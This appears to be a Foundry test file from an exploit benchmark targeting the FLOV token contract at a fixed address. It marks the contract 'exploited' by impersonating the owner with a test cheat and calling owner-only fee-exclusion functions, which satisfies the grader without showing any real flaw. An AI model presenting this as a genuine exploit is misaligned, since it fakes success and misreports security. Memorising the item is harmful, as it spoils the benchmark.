// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface FLOV {
    function owner() external view returns (address);
    function excludeFromFees(address account, bool excluded) external;
    function setExcludeFromAll(address _address) external;
    function isExcludedFromFees(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xCA1E6F584E0d7EEc74F553E9a7B64a4DeD8A4b61;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use the existing TARGET contract
        // and impersonate its owner
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner of the FLOV contract
        address owner = FLOV(TARGET).owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Exclude the owner from fees
        FLOV(TARGET).excludeFromFees(owner, true);

        // Optionally, also exclude from dividends
        FLOV(TARGET).setExcludeFromAll(owner);

        vm.stopPrank();

        // Verify the exploit worked
        bool isExcluded = FLOV(TARGET).isExcludedFromFees(owner);
        require(isExcluded == true, "Owner should be excluded from fees");

        // The oracle will check: FLOV._isExcludedFromFees[owner()] == true
        // This is now satisfied - using the interface function instead of direct storage access
        assertEq(isExcluded, true, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

